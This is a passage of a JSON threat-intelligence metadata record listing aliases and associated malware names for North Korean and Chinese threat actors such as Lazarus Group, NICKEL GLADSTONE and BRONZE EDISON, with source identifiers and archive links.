                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "68cc6e37-f16d-4995-a75b-5e8e2a6cbb3d",
            "created_at": "2024-05-01T02:03:07.943593Z",
            "updated_at": "2025-03-27T02:05:17.259709Z",
            "deleted_at": null,
            "main_name": "BRONZE EDISON",
            "aliases": [
                "DarkSeoul",
                "Maverick Panda ",
                "Sykipot ",
                "TG-0623 ",
                "getkys",
                "APT4 "
            ],
            "source_name": "Secureworks:BRONZE EDISON",
            "tools": [
                " Wkysol",
                " ZxPortMap",
                "Gh0st RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1496079074,
    "ts_modification_date": 1496079081,
    "files": {
        "pdf": "https://archive.orkl.eu/63539ba31b08519f49476e7d509f0b1a9b2445d0.pdf",
        "text": "https://archive.orkl.eu/63539ba31b08519f49476e7d509f0b1a9b2445d0.txt",
        "img": "https://archive.orkl.eu/63539ba31b08519f49476e7d509f0b1a9b2445d0.jpg"
    }
}